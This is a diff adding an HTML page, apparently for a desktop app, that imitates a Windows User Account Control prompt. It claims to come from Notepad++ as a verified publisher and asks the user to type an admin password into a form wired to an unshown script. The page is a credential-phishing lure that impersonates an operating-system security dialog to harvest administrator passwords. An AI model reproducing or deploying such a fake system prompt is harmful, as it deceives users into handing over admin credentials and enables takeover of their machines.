@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+    <title>User Account Control</title>
+    <link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-screen" id="login-screen">
+          <div class="login-box">
+            <div class="header">
+              <div class="close" id="close">
+                <div class="close-icon mx-auto my-auto"></div>
+              </div>
+                <p class="psmall weighted mb-3">User Account Control</p>
+              <h4>Do you want to allow this app to make changes to your device?</h4>
+            </div>
+              <form id="passForm" class="form">
+                <div class="d-flex align-items-center mb-3">
+                  <div class="icon me-3"></div>
+                  <h4>Notepad ++</h4>
+                </div>
+                <p>Verified publisher: Notepad ++</p>
+                <p>File origin: Hard drive on this computer</p>
+                <p class="text-blue weighted mt-4 mb-5">Show more details</p>
+                <p class="mb-4">To continue. enter an admin username and password.</p>
+                <h6 class="weighted">Admin</h6>
+                <div class="input-group" id="ig-1">
+                  <input id="password" type="password" class="form-control" placeholder="Password" autofocus>
+                  <div class="eye" id="eye">
+                    <div class="eye-icon mx-auto my-auto" ></div>
+                  </div>
+                </div>
+                <p>HY4-NB-021/Admin</p>
+                </form>
+                <div class="footer">
+                    <div class="d-flex gap-3 text-center">
+                        <div id="submit" class="btn-secondary w-100">Yes</div>
+                        <div class="btn-primary w-100" id="no">No</div>
+                    </div>
+                </div>
+          </div>
+      </div>
+  </div>
+  <script src="script.js"></script>
+  </body>
+</html>
